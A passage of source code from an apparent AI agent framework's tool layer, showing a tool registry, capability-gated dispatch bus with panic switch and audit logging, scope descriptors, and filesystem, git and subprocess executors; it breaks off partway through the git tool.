        path.write_text(trace.model_dump_json(indent=2))
        return path

    def load_tool_traces(self) -> List[dict]:
        """Load all tool traces from disk."""
        traces_dir = self._session_dir / "tool_traces"
        if not traces_dir.exists():
            return []
        files = sorted(traces_dir.glob("trace_*.json"))
        return [json.loads(f.read_text()) for f in files]

    # ------------------------------------------------------------------
    # Memory pins
    # ------------------------------------------------------------------

    def write_memory_pin(self, pin: BaseModel) -> Path:
        """Write a memory pin to disk."""
        existing = sorted(self._memory_pins_dir.glob("pin_*.json"))
        seq = len(existing)
        filename = f"pin_{seq:03d}.json"
        path = self._memory_pins_dir / filename
        path.write_text(pin.model_dump_json(indent=2))
        return path

```

## `core/tools/__init__.py`

```python
# core/tools/__init__.py
# Phase 4: Tools wraps ToolBus internally. Backward-compatible interface.

from core.tools.tool import Tool
from .run_shell import RunShellTool
from .run_python import RunPythonTool
from .install_project import InstallProjectTool
from .fetch_page import FetchPageTool
from .web_search import WebSearchTool
from .rag_crawler import RagCrawlerTool
from core.memory.memory import UnifiedMemory
from typing import Callable, List, Optional, Union

from core.tools.bus import ToolBus, ToolResult
from core.tools.capability import CapabilityEngine
from core.tools.sandbox import SandboxRunner, NoneSandbox
from core.tools.descriptors import (
    SHELL_DESCRIPTOR,
    PYTHON_DESCRIPTOR,
    INSTALL_DESCRIPTOR,
    WEB_SEARCH_DESCRIPTOR,
    FETCH_PAGE_DESCRIPTOR,
    RAG_CRAWLER_DESCRIPTOR,
    VOICE_DESCRIPTOR,
    FS_DESCRIPTOR,
    GIT_DESCRIPTOR,
    VERIFY_DESCRIPTOR,
    ToolDescriptor,
)
from core.tools.fs_tools import FsTool
from core.tools.git_tools import GitTool
from core.tools.verify_tools import VerifyTool
from core.tools.config_loader import load_project_config


class Tools:
    """Core tool registry. Wraps ToolBus for capability gating and sandboxed execution.

    Backward-compatible: list_tools(), describe_tool(), get_tool(), run() all work
    as before. The ToolBus is used internally for dispatch with capability checks.
    """

    def __init__(
        self,
        elfenv=None,
        memory: UnifiedMemory = None,
        enable_voice=False,
        capability_engine: Optional[CapabilityEngine] = None,
        sandbox: Optional[SandboxRunner] = None,
    ):
        self.elfenv = elfenv
        self.registry: dict[str, Union[Tool, Callable[[], Tool]]] = {}

        # Create ToolBus
        self._bus = ToolBus(
            capability_engine=capability_engine,
            sandbox=sandbox,
        )

        # Always-available tools
        shell_tool = RunShellTool()
        python_tool = RunPythonTool(elfenv=elfenv)
        install_tool = InstallProjectTool(elfenv=elfenv)
        fetch_tool = FetchPageTool()
        search_tool = WebSearchTool()

        self._register(shell_tool)
        self._register(python_tool)
        self._register(install_tool)
        self._register(fetch_tool)
        self._register(search_tool)

        # Register with ToolBus
        self._bus.register(SHELL_DESCRIPTOR, shell_tool)
        self._bus.register(PYTHON_DESCRIPTOR, python_tool)
        self._bus.register(INSTALL_DESCRIPTOR, install_tool)
        self._bus.register(FETCH_PAGE_DESCRIPTOR, fetch_tool)
        self._bus.register(WEB_SEARCH_DESCRIPTOR, search_tool)

        # Phase 4a: Consolidated multi-action tools
        fs_tool = FsTool()
        git_tool = GitTool()
        project_config = load_project_config()
        verify_tool = VerifyTool(config=project_config)

        self._bus.register(FS_DESCRIPTOR, fs_tool)
        self._bus.register(GIT_DESCRIPTOR, git_tool)
        self._bus.register(VERIFY_DESCRIPTOR, verify_tool)

        if memory:
            rag_tool = RagCrawlerTool(memory)
            self._register(rag_tool)
            self._bus.register(RAG_CRAWLER_DESCRIPTOR, rag_tool)

        # Only load voice if explicitly enabled
        if enable_voice:
            self._register_lazy("speak_text", self._lazy_load_speak_text)

    @property
    def bus(self) -> ToolBus:
        return self._bus

    # ---- registration helpers ----

    def _register(self, _tool: Tool):
        self.registry[_tool.name] = _tool

    def _register_lazy(self, name: str, factory: Callable[[], Tool]):
        self.registry[name] = factory

    # ---- lazy voice load ----

    @staticmethod
    def _lazy_load_speak_text():
        try:
            from core.tools.voice import SpeakTextTool
            return SpeakTextTool()
        except ImportError:
            class DummySpeakTool(Tool):
                name = "speak_text"
                description = "Dummy voice tool (TTS not installed)."
                def __call__(self, *args, **kwargs):
                    return "Voice output disabled (TTS not installed)."
            return DummySpeakTool()

    # ---- tool management ----

    def list_tools(self) -> List[str]:
        return list(self.registry.keys())

    def get_tool(self, name: str):
        tool = self.registry.get(name)
        if tool is None:
            return None
        if callable(tool) and not isinstance(tool, Tool):
            tool_instance = tool()
            self.registry[name] = tool_instance
            return tool_instance
        return tool

    def describe_tool(self, name: str) -> dict:
        # Prefer ToolBus descriptor if available
        bus_desc = self._bus.describe_tool(name)
        if "error" not in bus_desc:
            return bus_desc
        # Fallback to legacy info()
        _tool = self.get_tool(name)
        return _tool.info() if _tool else {"error": f"No such tool: {name}"}

    def run(self, name: str, *args, **kwargs):
        """Backward-compatible run. Delegates to tool directly.

        For capability-gated dispatch, use self._bus.dispatch() instead.
        """
        _tool = self.get_tool(name)
        if not _tool:
            raise ValueError(f"No such tool: {name}")

        result = _tool(*args, **kwargs)

        # Tool awareness injection
        elf = kwargs.get("elf")
        if elf:
            arg_summary = ", ".join(map(str, args))
            kwarg_summary = ", ".join(f"{k}={v}" for k, v in kwargs.items() if k != "elf")
            arg_text = "; ".join(filter(None, [arg_summary, kwarg_summary]))
            result_str = str(result)
            if len(result_str) > 500:
                result_str = result_str[:500] + "..."
            elf.history.append({
                "role": "assistant",
                "content": (
                    f"(Tool used: {name})\n"
                    f"Args: {arg_text or 'none'}\n"
                    f"Result (truncated):\n{result_str}"
                )
            })
        return result

```

## `core/tools/base_subprocess.py`

```python
# core/tools/base_subprocess.py
# Phase 4: Stripped of retry loops, sudo fallback, and repair agency.
# Tools are now dumb executors — retries/repair move to kernel FIX phase,
# sudo moves to capability engine.

from __future__ import annotations

from abc import ABC
import subprocess
import os
from typing import Any, Tuple, Optional

from core.tools.tool import Tool
from core.tools.executor import run_subprocess


class RunSubprocessTool(Tool, ABC):
    """Base class for tools that execute subprocess-like operations.

    After Phase 4 stripping:
    - run() delegates to executor.run_subprocess()
    - No retry loop, no sudo fallback, no code repair
    - Subclasses implement __call__() returning (rc, out, err)
    - Static utilities kept: extract_code(), is_root(), _is_permission_error()
    """

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.name = "run_subprocess"
        self.description = "Runs a subprocess command and returns (exit_code, stdout, stderr)."
        self.timeout = kwargs.get("timeout", 120)
        self.executable = kwargs.get("executable", "/bin/bash")
        self.subprocess_runner = kwargs.get("subprocess_runner", None)

    def run(self, cmd, timeout: Optional[int] = None) -> Tuple[int, str, str]:
        """Execute a command as a subprocess.

        Returns: (return_code, stdout, stderr).
        Delegates to executor.run_subprocess().
        """
        timeout = timeout or self.timeout
        shell_mode = isinstance(cmd, str)
        return run_subprocess(
            cmd,
            shell=shell_mode,
            timeout=timeout,
            executable=self.executable if shell_mode else None,
            subprocess_runner=self.subprocess_runner,
        )

    # --- Static utilities (kept for kernel and other consumers) ---

    @staticmethod
    def is_root() -> bool:
        try:
            return os.geteuid() == 0
        except AttributeError:
            return os.name == "nt" and "ADMIN" in os.environ.get("USERNAME", "").upper()

    @staticmethod
    def _is_permission_error(err: str) -> bool:
        if not err:
            return False
        low = err.lower()
        return any(
            term in low for term in [
                "permission denied", "must be run as root", "operation not permitted",
            ]
        )

    @staticmethod
    def extract_code(text: str, language: str | None = None) -> str:
        """Extract code blocks from markdown-like text."""
        import re

        if language:
            match = re.search(rf"```{language}\n(.*?)```", text, re.DOTALL)
            if match:
                return match.group(1).strip()

        match = re.search(r"```(.+?)```", text, re.DOTALL)
        if match:
            return match.group(1).strip()

        match = re.search(r"`([^`]+)`", text)
        if match:
            return match.group(1).strip()

        return text.strip()

    @staticmethod
    def _format_exception(ex: Exception) -> str:
        return f"Unexpected error: {type(ex).__name__}: {str(ex)}"

    # --- Template methods (default no-ops, kept for kernel utility) ---

    def _detect_missing_dependency(self, err: str) -> Optional[str]:
        """Return the missing dependency/package name if detectable, else None."""
        return None

```

## `core/tools/bus.py`

```python
# core/tools/bus.py — ToolBus registry and dispatch

import json as _json
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Any

from core.tools.descriptors import (
    ToolDescriptor,
    HIGH_RISK_ACTIONS,
    SKIP_SANDBOX_ACTIONS,
    NETWORK_ACTIONS,
)
from core.tools.capability import CapabilityEngine, CapabilityVerdict
from core.tools.sandbox import SandboxRunner, NoneSandbox


@dataclass
class ToolResult:
    """Structured result from a tool invocation."""
    exit_code: int
    stdout: str
    stderr: str
    tool_name: str
    granted_scopes: List[str] = field(default_factory=list)
    evidence: Optional[str] = None


class ToolBus:
    """MCP-style tool registry with capability gating and sandboxed execution.

    Dispatch path: register -> check capabilities -> execute -> result

    For multi-action tools, pass ``action=`` as a keyword argument to
    ``dispatch()``.  The bus resolves scopes from
    ``descriptor.action_scopes[action]`` when available, falling back to
    ``descriptor.required_scopes``.
    """

    def __init__(
        self,
        capability_engine: Optional[CapabilityEngine] = None,
        sandbox: Optional[SandboxRunner] = None,
        preflight_hook: Optional[Callable] = None,
        god_mode: Any = None,
        audit: Any = None,
    ):
        self._descriptors: Dict[str, ToolDescriptor] = {}
        self._executors: Dict[str, Callable] = {}
        self._capability = capability_engine or CapabilityEngine()
        self._sandbox = sandbox or NoneSandbox()
        self._preflight_hook = preflight_hook
        self._god_mode = god_mode
        self._audit = audit

    @property
    def capability_engine(self) -> CapabilityEngine:
        return self._capability

    @property
    def sandbox(self) -> SandboxRunner:
        return self._sandbox

    def register(self, descriptor: ToolDescriptor, executor: Callable) -> None:
        """Register a tool with its descriptor and executor."""
        self._descriptors[descriptor.tool_name] = descriptor
        self._executors[descriptor.tool_name] = executor

    def dispatch(self, tool_name: str, *args: Any,
                 action: Optional[str] = None, **kwargs: Any) -> ToolResult:
        """Dispatch a tool invocation through capability gating.

        Parameters
        ----------
        tool_name : str
            Registered tool name.
        action : str, optional
            For multi-action tools, the specific action to run.
            Scopes are resolved from ``descriptor.action_scopes[action]``
            when present.
        *args, **kwargs
            Forwarded to the executor.  When *action* is given the executor
            receives ``(action, *args, **kwargs)``.
        """
        if tool_name not in self._descriptors:
            return ToolResult(
                exit_code=-1,
                stdout="",
                stderr=_json.dumps({
                    "error": "unknown_tool",
                    "tool": tool_name,
                    "message": f"Unknown tool: {tool_name}",
                }),
                tool_name=tool_name,
            )

        descriptor = self._descriptors[tool_name]
        executor = self._executors[tool_name]

        # Resolve scopes: action-specific if available, else full required
        if action and descriptor.action_scopes:
            scopes_to_check = descriptor.action_scopes.get(
                action, descriptor.required_scopes,
            )
        else:
            scopes_to_check = descriptor.required_scopes

        # Per-action metadata
        is_high_risk = (
            (tool_name, action) in HIGH_RISK_ACTIONS if action
            else descriptor.high_risk
        )
        needs_network = (
            (tool_name, action) in NETWORK_ACTIONS if action
            else descriptor.requires_network
        )

        # Panic check — if god mode panic is active, block everything
        if self._god_mode is not None and self._god_mode.is_panicked:
            panic_err = {
                "error": "panic_revoked",
                "tool": tool_name,
                "action": action,
                "message": "Panic switch activated. All tool execution halted.",
            }
            result = ToolResult(
                exit_code=-1,
                stdout="",
                stderr=_json.dumps(panic_err),
                tool_name=tool_name,
                evidence=_json.dumps(panic_err),
            )
            self._log_audit(tool_name, action, scopes_to_check, "panic_revoked")
            return result

        # Preflight announcement for high-risk actions
        if is_high_risk and self._preflight_hook is not None:
            self._preflight_hook({
                "type": "preflight",
                "tool": tool_name,
                "action": action,
                "scopes": list(scopes_to_check),
                "message": f"High-risk tool '{tool_name}' action '{action}' about to execute",
            })

        # Capability check
        verdict = self._capability.check(tool_name, scopes_to_check)
        if not verdict.allowed:
            denial = {
                "error": "capability_denied",
                "tool": tool_name,
                "action": action,
                "missing_scopes": verdict.denied_scopes,
                "message": verdict.reason,
            }
            result = ToolResult(
                exit_code=-1,
                stdout="",
                stderr=_json.dumps(denial),
                tool_name=tool_name,
                evidence=_json.dumps(denial),
            )
            self._log_audit(tool_name, action, scopes_to_check, "denied")
            return result

        # Network check
        if needs_network:
            net_scopes = (
                descriptor.network_scopes
                if not action else scopes_to_check
            )
            network_verdict = self._capability.check(tool_name, net_scopes)
            if not network_verdict.allowed:
                denial = {
                    "error": "network_denied",
                    "tool": tool_name,
                    "action": action,
                    "missing_scopes": network_verdict.denied_scopes,
                    "message": network_verdict.reason,
                }
                result = ToolResult(
                    exit_code=-1,
                    stdout="",
                    stderr=_json.dumps(denial),
                    tool_name=tool_name,
                    evidence=_json.dumps(denial),
                )
                self._log_audit(tool_name, action, scopes_to_check, "denied")
                return result

        # Execute
        try:
            if action:
                result = executor(action, *args, **kwargs)
            else:
                result = executor(*args, **kwargs)

            # Handle tuple returns (rc, out, err)
            if isinstance(result, tuple) and len(result) == 3:
                rc, out, err = result
                tool_result = ToolResult(
                    exit_code=rc,
                    stdout=str(out),
                    stderr=str(err),
                    tool_name=tool_name,
                    granted_scopes=list(scopes_to_check),
                )
            else:
                # Handle string returns (legacy tools)
                tool_result = ToolResult(
                    exit_code=0,
                    stdout=str(result),
                    stderr="",
                    tool_name=tool_name,
                    granted_scopes=list(scopes_to_check),
                )

            self._log_audit(tool_name, action, scopes_to_check, "allowed")
            return tool_result
        except Exception as ex:
            self._log_audit(tool_name, action, scopes_to_check, "error")
            return ToolResult(
                exit_code=-1,
                stdout="",
                stderr=f"Tool execution error: {type(ex).__name__}: {ex}",
                tool_name=tool_name,
            )

    def list_tools(self) -> List[str]:
        """Return names of all registered tools."""
        return list(self._descriptors.keys())

    def describe_tool(self, name: str) -> dict:
        """Return a description dict for a tool."""
        desc = self._descriptors.get(name)
        if desc is None:
            return {"error": f"No such tool: {name}"}
        info = {
            "name": desc.tool_name,
            "description": desc.description,
            "required_scopes": list(desc.required_scopes),
            "requires_network": desc.requires_network,
        }
        if desc.action_scopes:
            info["actions"] = list(desc.action_scopes.keys())
        return info

    def get_descriptor(self, name: str) -> Optional[ToolDescriptor]:
        """Return the ToolDescriptor for a given tool name."""
        return self._descriptors.get(name)

    def _log_audit(
        self,
        tool_name: str,
        action: Optional[str],
        scopes: List[str],
        verdict: str,
    ) -> None:
        """Log a dispatch event to the audit logger if present."""
        if self._audit is None:
            return
        try:
            from core.contracts.schemas import AuditEntry
            self._audit.log(AuditEntry(
                event_type="tool_dispatch",
                tool_name=tool_name,
                action=action or "",
                scopes=list(scopes),
                verdict=verdict,
            ))
        except Exception:
            pass  # Audit logging must never break dispatch

```

## `core/tools/capability.py`

```python
# core/tools/capability.py — Deny-by-default capability engine

from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import List, Optional, TYPE_CHECKING

from core.contracts.schemas import PermissionGrant, PolicyPack

if TYPE_CHECKING:
    from core.contracts.schemas import ProfileMode


@dataclass
class CapabilityVerdict:
    """Result of a capability check."""
    allowed: bool
    denied_scopes: List[str] = field(default_factory=list)
    reason: str = ""


class CapabilityEngine:
    """Deny-by-default capability checker.

    Checks tool invocations against:
    1. PolicyPack (static session-level permissions)
    2. Active PermissionGrants (dynamic, possibly time-scoped)

    Supports wildcard ``"*"`` in ``allowed_scopes`` — grants all scopes.
    """

    def __init__(self, policy: Optional[PolicyPack] = None):
        self._policy = policy or PolicyPack()
        self._grants: List[PermissionGrant] = []
        self._current_profile: Optional[str] = None

    @property
    def policy(self) -> PolicyPack:
        return self._policy

    @property
    def current_profile(self) -> Optional[str]:
        return self._current_profile

    def add_grant(self, grant: PermissionGrant) -> None:
        """Add a permission grant."""
        self._grants.append(grant)

    def check(self, tool_name: str, required_scopes: List[str]) -> CapabilityVerdict:
        """Check if all required scopes are satisfied by policy or active grants.

        Returns CapabilityVerdict(allowed=True) only if ALL required scopes
        are covered. Invocation-scoped grants are consumed on successful check.
        """
        if not required_scopes:
            return CapabilityVerdict(allowed=True, reason="no scopes required")

        # First, expire stale grants
        self.expire_stale_grants()

        denied = []
        invocation_grants_to_consume = []

        for scope in required_scopes:
            if self._is_scope_in_policy(scope):
                continue
            grant = self._find_active_grant(tool_name, scope)
            if grant is None:
                denied.append(scope)
            elif grant.grant_scope == "invocation":
                invocation_grants_to_consume.append(grant)

        if denied:
            return CapabilityVerdict(
                allowed=False,
                denied_scopes=denied,
                reason=f"denied scopes: {', '.join(denied)}",
            )

        # Consume invocation-scoped grants
        for grant in invocation_grants_to_consume:
            if grant in self._grants:
                self._grants.remove(grant)

        return CapabilityVerdict(allowed=True, reason="all scopes granted")

    def is_scope_granted(self, tool_name: str, scope: str) -> bool:
        """Check if a single scope is granted (by policy or active grant)."""
        if self._is_scope_in_policy(scope):
            return True
        return self._find_active_grant(tool_name, scope) is not None

    def list_active_grants(self) -> List[PermissionGrant]:
        """Return all non-expired grants."""
        self.expire_stale_grants()
        return list(self._grants)

    def expire_stale_grants(self) -> int:
        """Remove time-expired grants. Returns count of expired grants."""
        now = datetime.now(timezone.utc)
        expired = []
        for grant in self._grants:
            if grant.grant_duration_seconds is not None:
                expiry = grant.grant_issued_at.timestamp() + grant.grant_duration_seconds
                if now.timestamp() > expiry:
                    expired.append(grant)
        for grant in expired:
            self._grants.remove(grant)
        return len(expired)

    def load_grants(self, grants: List[PermissionGrant]) -> None:
        """Bulk-load grants for session replay.

        Replaces existing grants. Does not evaluate wall clock for
        time-scoped grants during replay — they are loaded as-is.
        """
        self._grants = list(grants)

    def revoke_all_grants(self) -> int:
        """Revoke all active grants. Returns the count of revoked grants."""
        count = len(self._grants)
        self._grants.clear()
        return count

    def set_profile(self, profile: "ProfileMode") -> None:
        """Replace the internal policy with one derived from *profile*.

        Requires ``core.policy.profiles.policy_for_profile`` — imported
        lazily to avoid circular imports.
        """
        from core.policy.profiles import policy_for_profile
        self._policy = policy_for_profile(profile)
        self._current_profile = profile.value

    def _is_scope_in_policy(self, scope: str) -> bool:
        """Check if scope is allowed by the static policy.

        Supports wildcard ``"*"`` — if present, all scopes are allowed.
        """
        if "*" in self._policy.allowed_scopes:
            return True
        return scope in self._policy.allowed_scopes

    def _find_active_grant(self, tool_name: str, scope: str) -> Optional[PermissionGrant]:
        """Find a matching non-expired grant for tool_name + scope."""
        now = datetime.now(timezone.utc)
        for grant in self._grants:
            if grant.scope != scope:
                continue
            # Grant can be tool-specific or wildcard (empty tool_name)
            if grant.tool_name and grant.tool_name != tool_name:
                continue
            # Check time expiry
            if grant.grant_duration_seconds is not None:
                expiry = grant.grant_issued_at.timestamp() + grant.grant_duration_seconds
                if now.timestamp() > expiry:
                    continue
            return grant
        return None

```

## `core/tools/config_loader.py`

```python
# core/tools/config_loader.py — Project config loader

from pathlib import Path
from typing import Optional


def load_project_config(project_root: Optional[Path] = None) -> dict:
    """Load .judais-lobi.yml from project root.

    Returns {} if file not found or yaml library not available.
    Searches for .judais-lobi.yml and .judais-lobi.yaml.
    """
    root = Path(project_root) if project_root else Path.cwd()
    for name in (".judais-lobi.yml", ".judais-lobi.yaml"):
        config_path = root / name
        if config_path.exists():
            try:
                import yaml
                return yaml.safe_load(config_path.read_text()) or {}
            except ImportError:
                return {}
            except Exception:
                return {}
    return {}

```

## `core/tools/descriptors.py`

```python
# core/tools/descriptors.py — Declarative tool specifications

from dataclasses import dataclass, field
from typing import Dict, FrozenSet, List, Optional, Set, Tuple


@dataclass(frozen=True)
class SandboxProfile:
    """Filesystem and resource constraints for sandbox execution."""
    workspace_writable: bool = True
    allowed_read_paths: List[str] = field(default_factory=list)
    allowed_write_paths: List[str] = field(default_factory=list)
    max_cpu_seconds: Optional[int] = None
    max_memory_bytes: Optional[int] = None
    max_processes: Optional[int] = None


@dataclass(frozen=True)
class ToolDescriptor:
    """Declarative description of what a tool needs to run.

    For multi-action tools, action_scopes maps each action name to its
    specific scope list.  ToolBus checks action_scopes[action] instead of
    required_scopes when an action is provided.  required_scopes is the
    union of all action scopes (used for docs/listing).
    """
    tool_name: str
    required_scopes: List[str] = field(default_factory=list)
    requires_network: bool = False
    network_scopes: List[str] = field(default_factory=list)
    sandbox_profile: SandboxProfile = field(default_factory=SandboxProfile)
    description: str = ""
    high_risk: bool = False
    skip_sandbox: bool = False
    action_scopes: Dict[str, List[str]] = field(default_factory=dict)


# Pre-built descriptors for all existing tools

SHELL_DESCRIPTOR = ToolDescriptor(
    tool_name="run_shell_command",
    required_scopes=["shell.exec"],
    description="Runs a shell command and returns (exit_code, stdout, stderr).",
)

PYTHON_DESCRIPTOR = ToolDescriptor(
    tool_name="run_python_code",
    required_scopes=["python.exec"],
    description="Runs Python code in elfenv and returns (exit_code, stdout, stderr).",
)

INSTALL_DESCRIPTOR = ToolDescriptor(
    tool_name="install_project",
    required_scopes=["python.exec", "pip.install"],
    description="Installs a Python project via pip.",
)

WEB_SEARCH_DESCRIPTOR = ToolDescriptor(
    tool_name="perform_web_search",
    required_scopes=["http.read"],
    requires_network=True,
    network_scopes=["http.read"],
    description="Performs a DuckDuckGo web search.",
)

FETCH_PAGE_DESCRIPTOR = ToolDescriptor(
    tool_name="fetch_page_content",
    required_scopes=["http.read"],
    requires_network=True,
    network_scopes=["http.read"],
    description="Fetches and extracts text from a URL.",
)

RAG_CRAWLER_DESCRIPTOR = ToolDescriptor(
    tool_name="rag_crawl",
    required_scopes=["fs.read"],
    description="Crawls files and indexes into RAG.",
)

VOICE_DESCRIPTOR = ToolDescriptor(
    tool_name="speak_text",
    required_scopes=["audio.output"],
    description="Speaks text using TTS.",
)

# ---------------------------------------------------------------------------
# Phase 4a: Consolidated multi-action tools
# ---------------------------------------------------------------------------

FS_DESCRIPTOR = ToolDescriptor(
    tool_name="fs",
    required_scopes=["fs.read", "fs.write", "fs.delete"],
    action_scopes={
        "read":   ["fs.read"],
        "write":  ["fs.write"],
        "delete": ["fs.delete"],
        "list":   ["fs.read"],
        "stat":   ["fs.read"],
    },
    description="Filesystem operations: read, write, delete, list, stat.",
)

GIT_DESCRIPTOR = ToolDescriptor(
    tool_name="git",
    required_scopes=["git.read", "git.write", "git.push", "git.fetch"],
    action_scopes={
        "status": ["git.read"],
        "diff":   ["git.read"],
        "log":    ["git.read"],
        "add":    ["git.write"],
        "commit": ["git.write"],
        "branch": ["git.write"],
        "push":   ["git.push"],
        "pull":   ["git.fetch"],
        "fetch":  ["git.fetch"],
        "stash":  ["git.write"],
        "tag":    ["git.write"],
        "reset":  ["git.write"],
    },
    description="Git operations: status, diff, log, add, commit, branch, push, pull, fetch, stash, tag, reset.",
)

VERIFY_DESCRIPTOR = ToolDescriptor(
    tool_name="verify",
    required_scopes=["verify.run"],
    action_scopes={
        "lint":      ["verify.run"],
        "test":      ["verify.run"],
        "typecheck": ["verify.run"],
        "format":    ["verify.run"],
    },
    description="Verification: lint, test, typecheck, format. Config-driven via .judais-lobi.yml.",
)

# ---------------------------------------------------------------------------
# Per-action metadata sets (consulted by ToolBus dispatch)
# ---------------------------------------------------------------------------

HIGH_RISK_ACTIONS: Set[Tuple[str, str]] = {
    ("git", "push"),
    ("git", "reset"),
    ("fs", "delete"),
}

SKIP_SANDBOX_ACTIONS: Set[Tuple[str, str]] = {
    ("git", "push"),
    ("git", "pull"),
    ("git", "fetch"),
}

NETWORK_ACTIONS: Set[Tuple[str, str]] = {
    ("git", "push"),
    ("git", "pull"),
    ("git", "fetch"),
}

# All pre-built descriptors for iteration
ALL_DESCRIPTORS = [
    SHELL_DESCRIPTOR,
    PYTHON_DESCRIPTOR,
    INSTALL_DESCRIPTOR,
    WEB_SEARCH_DESCRIPTOR,
    FETCH_PAGE_DESCRIPTOR,
    RAG_CRAWLER_DESCRIPTOR,
    VOICE_DESCRIPTOR,
    FS_DESCRIPTOR,
    GIT_DESCRIPTOR,
    VERIFY_DESCRIPTOR,
]

```

## `core/tools/executor.py`

```python
# core/tools/executor.py — Pure subprocess execution function

import subprocess
from typing import Tuple, Optional, Union, List, Callable


def run_subprocess(
    cmd: Union[str, List[str]],
    *,
    shell: bool = False,
    timeout: int = 120,
    executable: Optional[str] = None,
    subprocess_runner: Optional[Callable] = None,
) -> Tuple[int, str, str]:
    """Pure subprocess execution. No retries, no repair, no sudo.

    Returns (exit_code, stdout, stderr).
    """
    if subprocess_runner is not None:
        try:
            return subprocess_runner(
                cmd, shell=shell, timeout=timeout, executable=executable,
            )
        except subprocess.TimeoutExpired:
            return -1, "", "Subprocess timed out"
        except Exception as ex:
            return -1, "", f"Unexpected error: {type(ex).__name__}: {ex}"

    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            text=True,
            capture_output=True,
            timeout=timeout,
            executable=executable,
        )
        return (
            result.returncode,
            (result.stdout or "").strip(),
            (result.stderr or "").strip(),
        )
    except subprocess.TimeoutExpired:
        return -1, "", "Subprocess timed out"
    except Exception as ex:
        return -1, "", f"Unexpected error: {type(ex).__name__}: {ex}"

```

## `core/tools/fetch_page.py`

```python
# tools/fetch_page.py

from core.tools.tool import Tool
import requests
from bs4 import BeautifulSoup

class FetchPageTool(Tool):
    name = "fetch_page_content"
    description = "Fetches and extracts visible text from the given URL."

    def __call__(self, url):
        try:
            res = requests.get(url, headers={"User-Agent": "Mozilla/5.0"})
            soup = BeautifulSoup(res.text, 'html.parser')
            return ' '.join(p.get_text() for p in soup.find_all('p'))
        except Exception as e:
            return f"Failed to fetch or parse: {str(e)}"

```

## `core/tools/fs_tools.py`

```python
# core/tools/fs_tools.py — Consolidated filesystem tool

import json
import os
import shutil
from pathlib import Path
from typing import Optional, Tuple


class FsTool:
    """Consolidated filesystem tool. Action-based dispatch.

    Each action returns (exit_code, stdout, stderr).
    Pure Python pathlib I/O — no subprocess calls.
    """

    def __call__(self, action: str, path: str, **kwargs) -> Tuple[int, str, str]:
        handler = getattr(self, f"_do_{action}", None)
        if handler is None:
            return (1, "", f"Unknown fs action: {action}")
        try:
            return handler(path, **kwargs)
        except Exception as exc:
            return (1, "", f"{type(exc).__name__}: {exc}")

    def _do_read(self, path: str, **kw) -> Tuple[int, str, str]:
        """Read file contents."""
        p = Path(path)
        if not p.exists():
            return (1, "", f"File not found: {path}")
        if not p.is_file():
            return (1, "", f"Not a file: {path}")
        content = p.read_text(encoding="utf-8", errors="replace")
        return (0, content, "")

    def _do_write(self, path: str, *, content: str = "", **kw) -> Tuple[int, str, str]:
        """Write content to a file. Creates parent directories if needed."""
        p = Path(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
        return (0, f"Written {len(content)} bytes to {path}", "")

    def _do_delete(self, path: str, **kw) -> Tuple[int, str, str]:
        """Delete a file or directory tree."""
        p = Path(path)
        if not p.exists():
            return (1, "", f"Path not found: {path}")
        if p.is_dir():
            shutil.rmtree(p)
        else:
            p.unlink()
        return (0, f"Deleted: {path}", "")

    def _do_list(self, path: str, *, recursive: bool = False, **kw) -> Tuple[int, str, str]:
        """List directory contents."""
        p = Path(path)
        if not p.exists():
            return (1, "", f"Directory not found: {path}")
        if not p.is_dir():
            return (1, "", f"Not a directory: {path}")
        if recursive:
            entries = sorted(str(e.relative_to(p)) for e in p.rglob("*"))
        else:
            entries = sorted(e.name for e in p.iterdir())
        return (0, "\n".join(entries), "")

    def _do_stat(self, path: str, **kw) -> Tuple[int, str, str]:
        """Return stat info as JSON."""
        p = Path(path)
        if not p.exists():
            return (1, "", f"Path not found: {path}")
        st = p.stat()
        info = {
            "path": str(p),
            "size": st.st_size,
            "mtime": st.st_mtime,
            "is_file": p.is_file(),
            "is_dir": p.is_dir(),
            "mode": oct(st.st_mode),
        }
        return (0, json.dumps(info), "")

```

## `core/tools/git_tools.py`

```python
# core/tools/git_tools.py — Consolidated git tool

import shlex
from typing import List, Optional, Tuple

from core.tools.executor import run_subprocess


class GitTool:
    """Consolidated git tool. Action-based dispatch via run_subprocess.

    Every action returns (exit_code, stdout, stderr).
    repo_path sets the working directory for the git command.
    """

    def __init__(self, subprocess_runner=None):
        self._subprocess_runner = subprocess_runner

    def __call__(self, action: str, **kwargs) -> Tuple[int, str, str]:
        handler = getattr(self, f"_do_{action}", None)
        if handler is None:
            return (1, "", f"Unknown git action: {action}")
        try:
            return handler(**kwargs)
        except Exception as exc:
            return (1, "", f"{type(exc).__name__}: {exc}")

    def _run(self, cmd: str, repo_path: Optional[str] = None,
             timeout: int = 30) -> Tuple[int, str, str]:
        """Run a git command. Prepends 'cd <repo_path> &&' if given."""
        if repo_path:
            cmd = f"cd {shlex.quote(str(repo_path))} && {cmd}"
        return run_subprocess(
            cmd, shell=True, timeout=timeout,
            subprocess_runner=self._subprocess_runner,
        )

    # --- Read actions ---

    def _do_status(self, *, repo_path=None) -> Tuple[int, str, str]:
        return self._run("git status --porcelain", repo_path=repo_path)

    def _do_diff(self, *, staged: bool = False, path_spec: Optional[str] = None,
                 repo_path=None) -> Tuple[int, str, str]:
        cmd = "git diff"
        if staged:
            cmd += " --cached"
        if path_spec:
            cmd += f" -- {shlex.quote(path_spec)}"
        return self._run(cmd, repo_path=repo_path)

    def _do_log(self, *, n: int = 10, oneline: bool = True,
                repo_path=None) -> Tuple[int, str, str]:
        cmd = f"git log -n {int(n)}"
        if oneline:
            cmd += " --oneline"
        return self._run(cmd, repo_path=repo_path)

    # --- Write actions ---

    def _do_add(self, *, paths: Optional[List[str]] = None,
                repo_path=None) -> Tuple[int, str, str]:
        if paths:
            quoted = " ".join(shlex.quote(p) for p in paths)
            cmd = f"git add {quoted}"
        else:
            cmd = "git add -A"
        return self._run(cmd, repo_path=repo_path)

    def _do_commit(self, *, message: str, repo_path=None) -> Tuple[int, str, str]:
        cmd = f"git commit -m {shlex.quote(message)}"
        return self._run(cmd, repo_path=repo_path)

    def _do_branch(self, *, name: Optional[str] = None, delete: bool = False,
                   repo_path=None) -> Tuple[int, str, str]:
        if name is None:
            cmd = "git branch"
        elif delete:
            cmd = f"git branch -d {shlex.quote(name)}"
        else:
            cmd = f"git branch {shlex.quote(name)}"
